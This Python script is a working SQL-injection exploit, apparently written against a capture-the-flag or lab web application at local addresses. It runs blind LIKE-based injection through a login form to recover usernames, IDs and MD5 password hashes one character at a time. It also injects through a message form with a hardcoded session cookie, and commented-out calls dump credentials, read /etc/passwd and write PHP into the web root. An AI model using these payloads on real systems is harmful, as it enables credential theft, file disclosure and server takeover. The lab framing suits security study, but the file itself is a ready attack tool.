import string
import requests
import random

phpsession = '13e4323d8265e2ec24c179464d20283d'

def get_password(username, url='172.17.0.2', verbose=False):
    # Password MD5 Hash
    chars_lower = 'abcdef'
    alfabeto = string.digits + chars_lower + chars_lower.upper()
    
    password = ''
    for _ in range(32):
        for char in alfabeto:
            tmp = password+char+'%'
            response = requests.post(f'http://{url}/login.php', data={
                'username': f"{username}' AND Password LIKE '{tmp}' LIMIT 1; #", 
                'password': '...'})
            
            if response.url == f"http://{url}/welcome.php":
                password += char
                if verbose: print(f'Found: {char}')
                break
    
    return password

def get_id(username, url='172.17.0.2', verbose=False):
    alfabeto = string.digits
    
    id = ''
    for _ in range(32):
        for char in alfabeto:
            tmp = id+char+'%'
            response = requests.post(f'http://{url}/login.php', data={
                'username': f"{username}' AND Id LIKE '{tmp}' LIMIT 1; #", 
                'password': '...'})
            
            if response.url == f"http://{url}/welcome.php":
                id += char
                if verbose: print(f'Found: {char}')
                break
    
    return id

def enum_users(url='172.17.0.2', verbose=False):
    alfabeto = string.digits + string.ascii_lowercase + string.punctuation
    alfabeto = [a for a in alfabeto]

    found = []
    for i in range(30):
        if verbose: print("Cerco user: #", i)
        random.shuffle(alfabeto)
        username = ''
        for _ in range(64):
            foundChar = False
            for char in alfabeto:
                if char == '%' or char == '_':
                    continue

                tmp = username+char+'%'
                response = requests.post(f'http://{url}/login.php', data={'username': f"' OR Username LIKE '{tmp}' LIMIT 1; #", 
                                            'password': '...'})
                
                if response.url == f'http://{url}/welcome.php':
                    foundChar = True
                    username += char
                    break
            
            if not foundChar:
                break

        found.append(username)
        if verbose: print(username)
    return set(found)

def inject_sql(command, url='172.17.0.2'):
    requests.post(f'http://{url}/send.php', data={
                'agent': '',
                'title': f"inject_sql', {command} ); #", 
                'message': '...'},
                cookies={
                    'PHPSESSID': phpsession
                })
    
def exec_sql(command, url='172.17.0.2'):
    requests.post(f'http://{url}/send.php', data={
                'agent': '',
                'title': f"inject_sql', 'message'); {command} #", 
                'message': '...'},
                cookies={
                    'PHPSESSID': phpsession
                })


if __name__ == '__main__':
    #print(get_password('jackofspade', '127.0.0.1:8080'))
    #print(get_id('tizio.incognito', '127.0.0.1:8080'))
    print(enum_users('127.0.0.1:8080'))

    #inject_sql("(SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'niadb' LIMIT 0, 1)", '127.0.0.1')
    #inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'agents' LIMIT 3, 1)", '127.0.0.1')
    
    #for i in range(10):
    #    inject_sql(f"(SELECT CONCAT(id, ' ', username, ' ', password) FROM agents LIMIT {i}, 1)", '127.0.0.1')

    #inject_sql("(SELECT LOAD_FILE('/etc/passwd')) LIMIT 1", '127.0.0.1')

    #inject_sql("(SELECT IF(COUNT(*) > 0, 'TRUE', 'FALSE') AS Allowed FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%admin%localhost%' AND PRIVILEGE_TYPE = 'CREATE USER')", '127.0.0.1')
    #exec_sql("SELECT '' INTO OUTFILE '/var/www/html/config.php' FIELDS TERMINATED BY '<?php phpinfo();?>'", '127.0.0.1')
    pass